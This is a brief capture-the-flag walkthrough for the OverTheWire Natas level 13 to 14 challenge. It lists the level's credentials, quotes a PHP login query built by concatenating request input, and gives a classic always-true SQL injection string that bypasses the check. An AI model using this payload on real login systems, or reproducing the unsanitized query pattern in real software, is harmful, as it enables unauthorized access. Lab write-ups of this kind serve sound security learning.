# Natas Level 13 --> Level 14

**Username:** natas14

**Password:** Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

**URL:**      http://natas14.natas.labs.overthewire.org

## Solution
* Click view sourcecode there you can see the query they use to access, there isn't anything special so we can inject simple code to bypass.
```
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
```
* Try login with any username and this password which implies that it will be always true.
```
123" or "1"="1
```
* You got the password!!

## Natas15 Password
> AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
